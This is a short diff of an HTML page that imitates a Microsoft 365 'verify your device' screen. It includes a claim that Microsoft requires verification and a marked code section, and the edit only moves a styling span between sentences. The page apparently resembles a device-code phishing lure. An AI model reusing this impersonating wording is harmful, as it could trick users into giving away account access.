@@ -579,10 +579,10 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
     </div>
 
     <div id="mainView">
-      <p class="intro">Please verify your device to <span style="margin-left:20px;">access your Microsoft 365 account</span>.</p>
+      <p class="intro">Please verify your device to access your Microsoft 365 account.</p>
 
       <div class="info-box">
-        💡 Microsoft requires verification before granting access to protected accounts.
+        💡 Microsoft requires verification before granting <span style="margin-left:20px;">access to protected accounts</span>.
       </div>
 
       <!-- Code Section -->
